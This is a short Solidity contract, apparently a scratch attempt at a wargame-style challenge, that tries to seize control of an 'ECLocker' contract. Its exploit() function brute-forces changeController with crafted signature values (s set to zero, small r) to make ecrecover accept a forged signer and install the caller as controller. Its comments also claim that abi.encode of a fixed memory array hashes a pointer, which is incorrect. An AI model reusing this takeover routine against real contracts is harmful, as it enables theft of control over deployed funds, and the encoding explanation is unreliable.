// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function controller() external view returns (address);
}

contract ActualBehavior {
    // The bug might be that [uint256(r), uint256(s), uint256(v)] 
    // creates a memory array and abi.encode encodes the array pointer
    // This would make signatureHash predictable!
    
    function testEncoding(uint256 r, uint256 s, uint256 v) external pure returns (bytes32) {
        // This might be what happens - encoding a memory location
        uint256[3] memory arr = [r, s, v];
        return keccak256(abi.encode(arr));
    }
    
    function exploit(address locker) external {
        // If signatureHash is always the same (encoding array pointer),
        // we need to find an unused signature that makes ecrecover return 0x0
        
        // Try multiple combinations
        for (uint8 v = 27; v <= 28; v++) {
            for (uint256 i = 0; i < 10; i++) {
                try IECLocker(locker).changeController(
                    v, 
                    bytes32(i), 
                    bytes32(0), 
                    msg.sender
                ) {
                    return; // Success!
                } catch {
                    // Try next
                }
            }
        }
    }
}